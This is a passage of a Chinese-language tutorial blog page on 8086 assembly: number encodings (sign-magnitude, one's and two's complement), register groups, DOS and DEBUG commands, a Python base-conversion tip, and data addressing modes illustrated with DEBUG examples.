B97;&#x3002;&#x8FD9;&#x4E09;&#x79CD;&#x7801;&#x7684;&#x5B9A;&#x4E49;&#x5982;&#x4E0B;&#xFF1A;<br>&#x539F;&#x7801;&#x3002;&#x539F;&#x7801;&#x5C06;&#x6700;&#x9AD8;&#x4F4D;&#x4F5C;&#x4E3A;&#x7B26;&#x53F7;&#x4F4D;&#xFF0C;&#x6B63;&#x6570;&#x4E3A;0&#xFF0C;&#x8D1F;&#x6570;&#x4E3A;1&#xFF0C;&#x5176;&#x4F59;7&#x4F4D;&#x4F5C;&#x4E3A;&#x6570;&#x503C;&#x4F4D;&#x3002;<br>&#x53CD;&#x7801;&#x3002;&#x6B63;&#x6570;&#x7684;&#x53CD;&#x7801;&#x4E0E;&#x6B63;&#x6570;&#x7684;&#x539F;&#x7801;&#x4E00;&#x6837;&#x3002;&#x800C;&#x6C42;&#x8D1F;&#x6570;&#x7684;&#x53CD;&#x7801;&#x65F6;&#xFF0C;&#x7B26;&#x53F7;&#x4F4D;&#x4E3A;1&#xFF0C;&#x6570;&#x503C;&#x4F4D;&#x5728;&#x539F;&#x7801;&#x7684;&#x57FA;&#x7840;&#x4E0A;&#x6C42;&#x53CD;&#x3002;<br>&#x8865;&#x7801;&#x3002;&#x6B63;&#x6570;&#x7684;&#x8865;&#x7801;&#x4E0E;&#x6B63;&#x6570;&#x7684;&#x539F;&#x7801;&#x4E00;&#x6837;&#x3002;&#x6C42;&#x8D1F;&#x6570;&#x7684;&#x8865;&#x7801;&#x65F6;&#xFF0C;&#x7B26;&#x53F7;&#x4F4D;&#x4E3A;1&#xFF0C;&#x6570;&#x503C;&#x4F4D;&#x5728;&#x539F;&#x7801;&#x7684;&#x57FA;&#x7840;&#x4E0A;&#x6C42;&#x53CD;&#x52A0;1&#x3002;<br>&#x4F8B; &#x5341;&#x8FDB;&#x5236;&#x6570;+5&#x548C;-5&#x5206;&#x522B;&#x8868;&#x793A;&#x6210;&#x4E8C;&#x8FDB;&#x5236;&#x6570;&#x539F;&#x7801;&#x3001;&#x53CD;&#x7801;&#x548C;&#x8865;&#x7801;&#x3002;<br>[+5]&#x539F;=[+5]&#x53CD;=[+5]&#x8865;=00000101B<br>[-5]&#x539F;=10000101B<br>[-5]&#x53CD;=11111010B<br>[-5]&#x8865;=11111011B</p><h2 id="8086&#x5BC4;&#x5B58;&#x5668;&#x7EC4;"><a href="#8086&#x5BC4;&#x5B58;&#x5668;&#x7EC4;" class="headerlink" title="8086&#x5BC4;&#x5B58;&#x5668;&#x7EC4;"></a>8086&#x5BC4;&#x5B58;&#x5668;&#x7EC4;</h2><p>8086&#x5BC4;&#x5B58;&#x5668;&#x90FD;&#x662F;16&#x4F4D;&#x7684;&#x5BC4;&#x5B58;&#x5668;&#xFF0C;&#x6839;&#x636E;&#x7528;&#x9014;&#x53EF;&#x5206;&#x4E3A;4&#x79CD;&#x7C7B;&#x578B;&#x3002;&#x5206;&#x522B;&#x662F;&#x6570;&#x636E;&#x5BC4;&#x5B58;&#x5668;&#x3001;&#x5730;&#x5740;&#x5BC4;&#x5B58;&#x5668;&#x3001;&#x6BB5;&#x5BC4;&#x5B58;&#x5668;&#x548C;&#x63A7;&#x5236;&#x5BC4;&#x5B58;&#x5668;&#x3002;&#x5982;&#x56FE;&#x6240;&#x793A;&#x3002; img</p><p>&#x6570;&#x636E;&#x5BC4;&#x5B58;&#x5668;&#x4E2D;&#x6BCF;&#x4E2A;&#x5BC4;&#x5B58;&#x5668;&#x53C8;&#x53EF;&#x4EE5;&#x5206;&#x4E3A;2&#x4E2A;8&#x4F4D;&#x7684;&#x5BC4;&#x5B58;&#x5668;&#x3002;&#x5206;&#x522B;&#x4E3A;AH&#x3001;AL&#xFF0C;BH&#x3001;BL&#xFF0C;CH&#x3001;CL&#xFF0C;DH&#x3001;DL&#x3002;H&#x8868;&#x793A;&#x9AD8;&#x5B57;&#x8282;&#xFF08;&#x9AD8;8&#x4F4D;&#xFF09;&#x5BC4;&#x5B58;&#x5668;&#x3001;L&#x8868;&#x793A;&#x4F4E;&#x5B57;&#x8282;&#xFF08;&#x4F4E;8&#x4F4D;&#xFF09;&#x5BC4;&#x5B58;&#x5668;&#x3002;&#x4F8B;&#x5982; &#x7528;AX&#x5BC4;&#x5B58;&#x5668;&#x5B58;&#x653E;&#x4E00;&#x4E2A;&#x5B57;1234H&#xFF0C;&#x8868;&#x793A;&#x4E3A;(AX)=1234H&#xFF0C;&#x5373;&#x9AD8;&#x5B57;&#x8282;12&#x653E;&#x5728;AH&#xFF0C;&#x4F4E;&#x5B57;&#x8282;34&#x653E;&#x5728;AL&#x4E2D;&#x3002;</p><p>&#x5730;&#x5740;&#x5BC4;&#x5B58;&#x5668;&#x5305;&#x62EC;&#x6307;&#x9488;&#x548C;&#x53D8;&#x5740;&#x5BC4;&#x5B58;&#x5668;SP&#x3001;BP&#x3001;SI&#x3001;DI&#x56DB;&#x4E2A;16&#x4F4D;&#x5BC4;&#x5B58;&#x5668;&#x3002;&#x987E;&#x540D;&#x601D;&#x4E49;&#xFF0C;&#x5B83;&#x4EEC;&#x53EF;&#x7528;&#x6765;&#x5B58;&#x653E;&#x5B58;&#x50A8;&#x5668;&#x64CD;&#x4F5C;&#x6570;&#x7684;&#x504F;&#x79FB;&#x5730;&#x5740;&#x3002;&#x53E6;&#x5916;&#xFF0C;&#x5B83;&#x4EEC;&#x4E5F;&#x53EF;&#x4EE5;&#x4F5C;&#x4E3A;&#x901A;&#x7528;&#x5BC4;&#x5B58;&#x5668;&#x7528;&#x3002;</p><p>8086CPU&#x6709;4&#x4E2A;16&#x4F4D;&#x7684;&#x6BB5;&#x5BC4;&#x5B58;&#x5668;&#xFF0C;&#x5206;&#x522B;&#x662F;CS&#x4EE3;&#x7801;&#x6BB5;&#x5BC4;&#x5B58;&#x5668;&#x3001;DS&#x6570;&#x636E;&#x6BB5;&#x5BC4;&#x5B58;&#x5668;&#x3001;ES&#x9644;&#x52A0;&#x6BB5;&#x5BC4;&#x5B58;&#x5668;&#x3001;SS&#x5806;&#x6808;&#x6BB5;&#x5BC4;&#x5B58;&#x5668;&#x3002;</p><h2 id="8086&#x5BC4;&#x5B58;&#x5668;&#x7EC4;-1"><a href="#8086&#x5BC4;&#x5B58;&#x5668;&#x7EC4;-1" class="headerlink" title="8086&#x5BC4;&#x5B58;&#x5668;&#x7EC4;"></a>8086&#x5BC4;&#x5B58;&#x5668;&#x7EC4;</h2><p>8086&#x5BC4;&#x5B58;&#x5668;&#x90FD;&#x662F;16&#x4F4D;&#x7684;&#x5BC4;&#x5B58;&#x5668;&#xFF0C;&#x6839;&#x636E;&#x7528;&#x9014;&#x53EF;&#x5206;&#x4E3A;4&#x79CD;&#x7C7B;&#x578B;&#x3002;&#x5206;&#x522B;&#x662F;&#x6570;&#x636E;&#x5BC4;&#x5B58;&#x5668;&#x3001;&#x5730;&#x5740;&#x5BC4;&#x5B58;&#x5668;&#x3001;&#x6BB5;&#x5BC4;&#x5B58;&#x5668;&#x548C;&#x63A7;&#x5236;&#x5BC4;&#x5B58;&#x5668;&#x3002;&#x5982;&#x56FE;&#x6240;&#x793A;&#x3002; img</p><p>&#x6570;&#x636E;&#x5BC4;&#x5B58;&#x5668;&#x4E2D;&#x6BCF;&#x4E2A;&#x5BC4;&#x5B58;&#x5668;&#x53C8;&#x53EF;&#x4EE5;&#x5206;&#x4E3A;2&#x4E2A;8&#x4F4D;&#x7684;&#x5BC4;&#x5B58;&#x5668;&#x3002;&#x5206;&#x522B;&#x4E3A;AH&#x3001;AL&#xFF0C;BH&#x3001;BL&#xFF0C;CH&#x3001;CL&#xFF0C;DH&#x3001;DL&#x3002;H&#x8868;&#x793A;&#x9AD8;&#x5B57;&#x8282;&#xFF08;&#x9AD8;8&#x4F4D;&#xFF09;&#x5BC4;&#x5B58;&#x5668;&#x3001;L&#x8868;&#x793A;&#x4F4E;&#x5B57;&#x8282;&#xFF08;&#x4F4E;8&#x4F4D;&#xFF09;&#x5BC4;&#x5B58;&#x5668;&#x3002;&#x4F8B;&#x5982; &#x7528;AX&#x5BC4;&#x5B58;&#x5668;&#x5B58;&#x653E;&#x4E00;&#x4E2A;&#x5B57;1234H&#xFF0C;&#x8868;&#x793A;&#x4E3A;(AX)=1234H&#xFF0C;&#x5373;&#x9AD8;&#x5B57;&#x8282;12&#x653E;&#x5728;AH&#xFF0C;&#x4F4E;&#x5B57;&#x8282;34&#x653E;&#x5728;AL&#x4E2D;&#x3002;</p><p>&#x5730;&#x5740;&#x5BC4;&#x5B58;&#x5668;&#x5305;&#x62EC;&#x6307;&#x9488;&#x548C;&#x53D8;&#x5740;&#x5BC4;&#x5B58;&#x5668;SP&#x3001;BP&#x3001;SI&#x3001;DI&#x56DB;&#x4E2A;16&#x4F4D;&#x5BC4;&#x5B58;&#x5668;&#x3002;&#x987E;&#x540D;&#x601D;&#x4E49;&#xFF0C;&#x5B83;&#x4EEC;&#x53EF;&#x7528;&#x6765;&#x5B58;&#x653E;&#x5B58;&#x50A8;&#x5668;&#x64CD;&#x4F5C;&#x6570;&#x7684;&#x504F;&#x79FB;&#x5730;&#x5740;&#x3002;&#x53E6;&#x5916;&#xFF0C;&#x5B83;&#x4EEC;&#x4E5F;&#x53EF;&#x4EE5;&#x4F5C;&#x4E3A;&#x901A;&#x7528;&#x5BC4;&#x5B58;&#x5668;&#x7528;&#x3002;</p><p>8086CPU&#x6709;4&#x4E2A;16&#x4F4D;&#x7684;&#x6BB5;&#x5BC4;&#x5B58;&#x5668;&#xFF0C;&#x5206;&#x522B;&#x662F;CS&#x4EE3;&#x7801;&#x6BB5;&#x5BC4;&#x5B58;&#x5668;&#x3001;DS&#x6570;&#x636E;&#x6BB5;&#x5BC4;&#x5B58;&#x5668;&#x3001;ES&#x9644;&#x52A0;&#x6BB5;&#x5BC4;&#x5B58;&#x5668;&#x3001;SS&#x5806;&#x6808;&#x6BB5;&#x5BC4;&#x5B58;&#x5668;&#x3002;</p><hr><p><img src="https://dn-simplecloud.shiyanlou.com/8029611540380109738-wm" alt="&#x5B9E;&#x9A8C;&#x697C;"></p><p><img src="https://dn-simplecloud.shiyanlou.com/8029611540381058721-wm" alt="&#x5B9E;&#x9A8C;&#x697C;"></p><h2 id="DOS&#x547D;&#x4EE4;&#x7528;&#x6CD5;"><a href="#DOS&#x547D;&#x4EE4;&#x7528;&#x6CD5;" class="headerlink" title="DOS&#x547D;&#x4EE4;&#x7528;&#x6CD5;"></a>DOS&#x547D;&#x4EE4;&#x7528;&#x6CD5;</h2><ol><li>&#x5217;&#x8868;&#x9879;&#x76EE;<br>DIR == &#x8FDB;&#x5165;&#x6839;&#x76EE;&#x5F55;<br>CD [filename] == &#x8FDB;&#x5165;&#x5B50;&#x76EE;&#x5F55;</li></ol><h2 id="DEBUG&#x547D;&#x4EE4;&#x7528;&#x6CD5;"><a href="#DEBUG&#x547D;&#x4EE4;&#x7528;&#x6CD5;" class="headerlink" title="DEBUG&#x547D;&#x4EE4;&#x7528;&#x6CD5;"></a>DEBUG&#x547D;&#x4EE4;&#x7528;&#x6CD5;</h2><p>&#x901A;&#x8FC7;&#x6539;&#x53D8;IP&#x7684;&#x503C;&#x53EF;&#x4EE5;&#x5728;&#x4E0D;&#x540C;&#x7684;&#x4F4D;&#x7F6E;&#x8FDB;&#x884C;&#x2013;&#x8F93;&#x5165;&#x6C47;&#x7F16;&#x6307;&#x4EE4;&#x548C;&#x53CD;&#x6C47;&#x7F16;&#x3002;</p><p>tips:</p><blockquote><p>&#x5728;&#x505A;&#x7684;&#x8FC7;&#x7A0B;&#x4E2D;&#x9047;&#x5230;&#x5341;&#x8FDB;&#x5236;&#x8F6C;&#x5341;&#x516D;&#x8FDB;&#x5236;&#x8FD9;&#x6837;&#x7684;&#x95EE;&#x9898;&#xFF0C;&#x81EA;&#x5DF1;&#x7B97;&#xFF01;&#xFF08;&#x600E;&#x4E48;&#x53EF;&#x80FD;&#x2026;&#xFF09;&#x60F3;&#x5230;&#x4E86;&#x4EE5;&#x524D;&#x7528;Python&#x65F6;&#x8FDB;&#x884C;&#x7684;&#x8FDB;&#x5236;&#x8F6C;&#x6362;&#x7528;&#x7740;&#x8FD8;&#x662F;&#x6BD4;&#x8F83;&#x65B9;&#x4FBF;&#x7684;&#x3002;<br></p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># &#x5341;&#x8FDB;&#x5236;&#x8F6C;&#x5341;&#x516D;&#x8FDB;&#x5236;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>hex(<span class="number">56</span>)</span><br><span class="line"><span class="string">&apos;0x38&apos;</span></span><br><span class="line"><span class="comment"># &#x5341;&#x516D;&#x8FDB;&#x5236;&#x8F6C;&#x5341;&#x8FDB;&#x5236;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>int(<span class="string">&apos;0xFFF&apos;</span>, <span class="number">16</span>)</span><br><span class="line"><span class="number">4095</span></span><br><span class="line"><span class="comment"># &#x4E8C;&#x8FDB;&#x5236;&#x8F6C;&#x5341;&#x8FDB;&#x5236;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>int(<span class="string">&apos;11101&apos;</span>, <span class="number">2</span>)</span><br><span class="line"><span class="number">29</span></span><br><span class="line"><span class="comment"># &#x516B;&#x8FDB;&#x5236;&#x8F6C;&#x5341;&#x8FDB;&#x5236;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>int(<span class="string">&apos;764&apos;</span>, <span class="number">8</span>)</span><br><span class="line"><span class="number">500</span></span><br><span class="line"><span class="comment"># &#x4E8C;&#x8FDB;&#x5236;&#x8F6C;&#x5341;&#x516D;&#x8FDB;&#x5236;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>hex(int(<span class="string">&apos;11101&apos;</span>, <span class="number">2</span>))</span><br><span class="line"><span class="string">&apos;0x1d&apos;</span></span><br></pre></td></tr></tbody></table></figure><p></p></blockquote><blockquote><p>&#x662F;&#x4E0D;&#x662F;&#x7279;&#x522B;&#x65B9;&#x4FBF;^_^<br><a href="https://blog.csdn.net/u012063703/article/details/42609833" target="_blank" rel="noopener">more</a></p></blockquote><h1 id="&#x4E8C;-&#x5BFB;&#x5740;&#x65B9;&#x5F0F;"><a href="#&#x4E8C;-&#x5BFB;&#x5740;&#x65B9;&#x5F0F;" class="headerlink" title="&#x4E8C; &#x5BFB;&#x5740;&#x65B9;&#x5F0F;:"></a>&#x4E8C; &#x5BFB;&#x5740;&#x65B9;&#x5F0F;:</h1><p>&#x6C47;&#x7F16;&#x6307;&#x4EE4;&#x7531;&#x64CD;&#x4F5C;&#x7801;&#x5B57;&#x6BB5;&#x548C;&#x64CD;&#x4F5C;&#x6570;&#x5B57;&#x6BB5;&#x6784;&#x6210;&#x3002;&#x5BF9;&#x4E8E;&#x53CC;&#x64CD;&#x4F5C;&#x6307;&#x4EE4;&#xFF0C;&#x7B2C;&#x4E00;&#x4E2A;&#x64CD;&#x4F5C;&#x6570;&#x79F0;&#x4E3A;&#x76EE;&#x7684;&#x64CD;&#x4F5C;&#x6570;&#xFF0C;&#x8868;&#x793A;&#x64CD;&#x4F5C;&#x540E;&#x7684;&#x7ED3;&#x679C;&#xFF1B;&#x7B2C;&#x4E8C;&#x4E2A;&#x64CD;&#x4F5C;&#x6570;&#x79F0;&#x4E3A;&#x6E90;&#x64CD;&#x4F5C;&#x6570;&#xFF0C;&#x8868;&#x793A;&#x6765;&#x6E90;&#x64CD;&#x4F5C;&#x6570;&#x3002;&#x4E24;&#x8005;&#x4EE5;&#x9017;&#x53F7;&#x5206;&#x9694;&#x3002;&#x5982;&#xFF1A;</p><p>img</p><p>&#x6240;&#x8C13;&#x5BFB;&#x5740;&#x65B9;&#x5F0F;&#xFF0C;&#x5373;&#x6307;&#x4EE4;&#x4E2D;&#x63D0;&#x4F9B;&#x64CD;&#x4F5C;&#x6570;&#x6216;&#x64CD;&#x4F5C;&#x6570;&#x5730;&#x5740;&#x7684;&#x65B9;&#x5F0F;&#x3002;&#x901A;&#x4FD7;&#x5730;&#x8BF4;&#x5C31;&#x662F;&#x5BFB;&#x627E;&#x64CD;&#x4F5C;&#x6570;&#x5730;&#x5740;&#x7684;&#x65B9;&#x6CD5;&#x3002;&#x5BFB;&#x5740;&#x65B9;&#x5F0F;&#x7684;&#x6570;&#x91CF;&#x4EE3;&#x8868;&#x4E86;&#x5FAE;&#x673A;&#x7CFB;&#x7EDF;&#x5BF9;&#x5B58;&#x50A8;&#x5668;&#x7BA1;&#x7406;&#x80FD;&#x529B;&#x7684;&#x5F3A;&#x5F31;&#xFF0C;&#x5408;&#x7406;&#x5730;&#x4F7F;&#x7528;&#x5BFB;&#x5740;&#x65B9;&#x5F0F;&#x53EF;&#x4EE5;&#x6269;&#x5927;&#x8BBF;&#x5B58;&#x7A7A;&#x95F4;&#xFF0C;&#x7F29;&#x77ED;&#x6307;&#x4EE4;&#x957F;&#x5EA6;&#xFF0C;&#x6EE1;&#x8DB3;&#x5404;&#x79CD;&#x7A0B;&#x5E8F;&#x8BBE;&#x8BA1;&#x9700;&#x8981;&#x3002;&#x4E0E;&#x6570;&#x636E;&#x6709;&#x5173;&#x7684;&#x5BFB;&#x5740;&#x65B9;&#x5F0F;&#x5212;&#x5206;&#x4E3A;&#x4E09;&#x7C7B;&#xFF1A;&#x7ACB;&#x5373;&#x5BFB;&#x5740;&#x65B9;&#x5F0F;&#xFF0C;&#x5BC4;&#x5B58;&#x5668;&#x5BFB;&#x5740;&#x65B9;&#x5F0F;&#xFF0C;&#x5B58;&#x50A8;&#x5668;&#x5BFB;&#x5740;&#x65B9;&#x5F0F;&#x3002;</p><h2 id="&#x7ACB;&#x5373;&#x5BFB;&#x5740;&#x65B9;&#x5F0F;"><a href="#&#x7ACB;&#x5373;&#x5BFB;&#x5740;&#x65B9;&#x5F0F;" class="headerlink" title="&#x7ACB;&#x5373;&#x5BFB;&#x5740;&#x65B9;&#x5F0F;"></a>&#x7ACB;&#x5373;&#x5BFB;&#x5740;&#x65B9;&#x5F0F;</h2><p>&#x6240;&#x8981;&#x627E;&#x7684;&#x64CD;&#x4F5C;&#x6570;&#x76F4;&#x63A5;&#x5199;&#x5728;&#x6307;&#x4EE4;&#x4E2D;&#xFF0C;&#x8FD9;&#x79CD;&#x64CD;&#x4F5C;&#x6570;&#x53EB;&#x7ACB;&#x5373;&#x6570;&#x3002;&#x5728;8086&#x3001;80286&#x4E2D;&#x7ACB;&#x5373;&#x6570;&#x662F;8&#x4F4D;&#x6216;16&#x4F4D;&#x7684;&#xFF0C;&#x5728;80386&#x4EE5;&#x4E0A;&#x53EF;&#x4EE5;&#x662F;32&#x4F4D;&#x7684;&#x7ACB;&#x5373;&#x6570;&#x3002;&#x7ACB;&#x5373;&#x5BFB;&#x5740;&#x65B9;&#x5F0F;&#x7528;&#x6765;&#x8868;&#x793A;&#x5E38;&#x6570;&#x3002;<br></p><figure class="highlight x86asm"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">-A</span><br><span class="line"><span class="keyword">MOV</span> <span class="built_in">AX</span>&#xFF0C;<span class="number">3060</span></span><br><span class="line"><span class="keyword">MOV</span> <span class="built_in">AL</span>&#xFF0C;<span class="number">5</span></span><br><span class="line"><span class="keyword">MOV</span> <span class="built_in">BL</span>&#xFF0C;FF</span><br><span class="line"><span class="keyword">MOV</span> <span class="built_in">BX</span>&#xFF0C;A46D </span><br><span class="line"><span class="keyword">MOV</span> <span class="built_in">CX</span>&#xFF0C;<span class="number">17</span></span><br></pre></td></tr></tbody></table></figure><p></p><h2 id="&#x5BC4;&#x5B58;&#x5668;&#x5BFB;&#x5740;&#x65B9;&#x5F0F;"><a href="#&#x5BC4;&#x5B58;&#x5668;&#x5BFB;&#x5740;&#x65B9;&#x5F0F;" class="headerlink" title="&#x5BC4;&#x5B58;&#x5668;&#x5BFB;&#x5740;&#x65B9;&#x5F0F;"></a>&#x5BC4;&#x5B58;&#x5668;&#x5BFB;&#x5740;&#x65B9;&#x5F0F;</h2><p>&#x5728;&#x5BC4;&#x5B58;&#x5668;&#x5BFB;&#x5740;&#x65B9;&#x5F0F;&#x4E2D;&#xFF0C;&#x64CD;&#x4F5C;&#x6570;&#x5728;&#x5BC4;&#x5B58;&#x5668;&#x4E2D;&#xFF0C;&#x5728;&#x6307;&#x4EE4;&#x4E2D;&#x6307;&#x5B9A;&#x5BC4;&#x5B58;&#x5668;&#x540D;&#x5373;&#x53EF;&#x3002;</p><figure class="highlight x86asm"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">-A</span><br><span class="line"><span class="keyword">MOV</span> <span class="built_in">AX</span>&#xFF0C;<span class="number">0</span></span><br><span class="line"><span class="keyword">MOV</span> <span class="built_in">BX</span>&#xFF0C;<span class="number">1234</span></span><br><span class="line"><span class="keyword">MOV</span> <span class="built_in">AX</span>&#xFF0C;<span class="built_in">BX</span></span><br><span class="line"><span class="keyword">MOV</span> <span class="built_in">CL</span>&#xFF0C;<span class="number">AH</span></span><br><span class="line"><span class="keyword">MOV</span> <span class="built_in">AX</span>&#xFF0C;<span class="number">4650</span></span><br></pre></td></tr></tbody></table></figure><h2 id="&#x76F4;&#x63A5;&#x5BFB;&#x5740;&#x65B9;&#x5F0F;"><a href="#&#x76F4;&#x63A5;&#x5BFB;&#x5740;&#x65B9;&#x5F0F;" class="headerlink" title="&#x76F4;&#x63A5;&#x5BFB;&#x5740;&#x65B9;&#x5F0F;"></a>&#x76F4;&#x63A5;&#x5BFB;&#x5740;&#x65B9;&#x5F0F;</h2><p>&#x64CD;&#x4F5C;&#x6570;&#x5B58;&#x653E;&#x5728;&#x5185;&#x5B58;&#x4E2D;&#x3002;&#x64CD;&#x4F5C;&#x6570;&#x7684;&#x504F;&#x79FB;&#x5730;&#x5740;&#xFF08;&#x4E5F;&#x79F0;&#x4E3A;&#x6709;&#x6548;&#x5730;&#x5740;EA&#xFF09;&#x76F4;&#x63A5;&#x5199;&#x5728;&#x6307;&#x4EE4;&#x4E2D;&#x3002;</p><p>&#xFF08;1&#xFF09;&#x5B58;&#x50A8;&#x5668;&#x8BFB;&#x64CD;&#x4F5C;</p><p>MOV&#x6307;&#x4EE4;&#x53EF;&#x4EE5;&#x5B9E;&#x73B0;CPU&#x5BF9;&#x5B58;&#x50A8;&#x5668;&#x7684;&#x8BFB;&#x5199;&#x3002;&#x82E5;&#x4F20;&#x9001;&#x6307;&#x4EE4;&#x7684;&#x76EE;&#x7684;&#x64CD;&#x4F5C;&#x6570;&#x662F;CPU&#x7684;&#x5BC4;&#x5B58;&#x5668;&#xFF0C;&#x6E90;&#x64CD;&#x4F5C;&#x6570;&#x662F;&#x5B58;&#x50A8;&#x5355;&#x5143;&#xFF0C;&#x5C31;&#x5B8C;&#x6210;&#x4E86;&#x5BF9;&#x5B58;&#x50A8;&#x5668;&#x7684;&#x8BFB;&#x64CD;&#x4F5C;&#x3002;</p><p>&#x4F8B;1 MOV AX&#xFF0C;DS:[2000H]<br>&#x8BE5;&#x6307;&#x4EE4;&#x8868;&#x793A;&#x4ECE;&#x6570;&#x636E;&#x6BB5;&#x7684;2000H&#x5355;&#x5143;&#x8BFB;&#x51FA;&#x4E00;&#x4E2A;&#x5B57;&#x9001;&#x5165;AX&#x3002;</p><p>&#xFF08;2&#xFF09;&#x5B58;&#x50A8;&#x5668;&#x5199;&#x64CD;&#x4F5C;</p><p>&#x5982;&#x679C;&#x8981;&#x5B9E;&#x73B0;CPU&#x5199;&#x5185;&#x5B58;&#x64CD;&#x4F5C;&#xFF0C;&#x53EA;&#x8981;&#x628A;MOV&#x6307;&#x4EE4;&#x7684;&#x76EE;&#x7684;&#x64CD;&#x4F5C;&#x6570;&#x53D8;&#x4E3A;&#x5B58;&#x50A8;&#x5355;&#x5143;&#xFF0C;&#x6E90;&#x64CD;&#x4F5C;&#x6570;&#x4E3A;CPU&#x7684;&#x5BC4;&#x5B58;&#x5668;&#x5373;&#x53EF;&#x3002;</p><p>&#x4F8B;2 MOV DS:[4000H]&#xFF0C;AX<br>&#x5C06;AX&#x7684;&#x503C;&#x5199;&#x5165;&#x6570;&#x636E;&#x6BB5;&#x7684;4000H&#x5355;&#x5143;&#x3002;<br></p><figure class="highlight x86asm"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">-A</span><br><span class="line"><span class="keyword">MOV</span> <span class="built_in">AX</span>&#xFF0C;<span class="built_in">DS</span>:[<span class="number">2000</span>]</span><br><span class="line"><span class="keyword">MOV</span> <span class="built_in">DS</span>:[<span class="number">4000</span>]&#xFF0C;<span class="built_in">AX</span></span><br></pre></td></tr></tbody></table></figure><p></p><h2 id="&#x5BC4;&#x5B58;&#x5668;&#x95F4;&#x63A5;&#x5BFB;&#x5740;&#x65B9;&#x5F0F;"><a href="#&#x5BC4;&#x5B58;&#x5668;&#x95F4;&#x63A5;&#x5BFB;&#x5740;&#x65B9;&#x5F0F;" class="headerlink" title="&#x5BC4;&#x5B58;&#x5668;&#x95F4;&#x63A5;&#x5BFB;&#x5740;&#x65B9;&#x5F0F;"></a>&#x5BC4;&#x5B58;&#x5668;&#x95F4;&#x63A5;&#x5BFB;&#x5740;&#x65B9;&#x5F0F;</h2><p>&#x64CD;&#x4F5C;&#x6570;&#x5B58;&#x653E;&#x5728;&#x5185;&#x5B58;&#x4E2D;&#x3002;&#x6307;&#x4EE4;&#x5F62;&#x5F0F;&#x5982;&#xFF1A; MOV AX&#xFF0C;[BX]<br>&#x64CD;&#x4F5C;&#x6570;&#x7684;EA&#x5728;&#x57FA;&#x5740;&#x5BC4;&#x5B58;&#x5668;BX&#x3001;BP&#x6216;&#x53D8;&#x5740;&#x5BC4;&#x5B58;&#x5668;SI&#x3001;DI&#x4E2D;&#xFF0C;&#x800C;&#x64CD;&#x4F5C;&#x6570;&#x7684;&#x6BB5;&#x5730;&#x5740;&#x5728;&#x6570;&#x636E;&#x6BB5;DS&#x6216;&#x5806;&#x6808;&#x6BB5;SS&#x4E2D;&#x3002;&#x5982;&#x679C;&#x6709;&#x6548;&#x5730;&#x5740;&#x7531;BX&#x3001;SI&#x3001;DI&#x6307;&#x51FA;&#xFF0C;&#x5219;&#x9ED8;&#x8BA4;&#x4E3A;&#x5BF9;&#x5E94;&#x4E8E;&#x6570;&#x636E;&#x6BB5;&#xFF0C;&#x800C;&#x7528;BP&#x6307;&#x51FA;&#x5219;&#x5BF9;&#x5E94;&#x4E8E;&#x5806;&#x6808;&#x6BB5;&#x3002;<br></p><figure class="highlight haml"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">-<span class="ruby">R DS <span class="number">1500</span></span></span><br><span class="line"><span class="ruby">-E <span class="symbol">DS:</span><span class="number">4580</span>  <span class="number">64</span> <span class="number">23</span></span></span><br><span class="line"><span class="ruby">-D <span class="symbol">DS:</span><span class="number">4580</span></span></span><br><span class="line"><span class="ruby">-A</span></span><br><span class="line"><span class="ruby">MOV BX&#xFF0C;<span class="number">4580</span></span></span><br><span class="line"><span class="ruby">MOV AX&#xFF0C;[BX]</span></span><br></pre></td></tr></tbody></table></figure><p></p><h2 id="&#x5BC4;&#x5B58;&#x5668;&#x76F8;&#x5BF9;&#x5BFB;&#x5740;&#x65B9;&#x5F0F;"><a href="#&#x5BC4;&#x5B58;&#x5668;&#x76F8;&#x5BF9;&#x5BFB;&#x5740;&#x65B9;&#x5F0F;" class="headerlink" title="&#x5BC4;&#x5B58;&#x5668;&#x76F8;&#x5BF9;&#x5BFB;&#x5740;&#x65B9;&#x5F0F;"></a>&#x5BC4;&#x5B58;&#x5668;&#x76F8;&#x5BF9;&#x5BFB;&#x5740;&#x65B9;&#x5F0F;</h2><p>&#x64CD;&#x4F5C;&#x6570;&#x5B58;&#x653E;&#x5728;&#x5185;&#x5B58;&#x4E2D;&#x3002;&#x6307;&#x4EE4;&#x5F62;&#x5F0F;&#x5982;&#xFF1A; MOV 